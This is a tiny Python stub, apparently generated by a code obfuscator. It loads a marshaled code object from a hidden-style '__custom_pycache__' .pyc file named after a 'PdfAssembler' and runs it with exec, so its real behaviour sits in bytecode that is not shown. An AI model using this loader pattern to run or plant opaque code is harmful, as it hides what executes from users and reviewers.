
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'PdfAssembler_3a3986cbbd4641338cb219ea583c5a9d.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
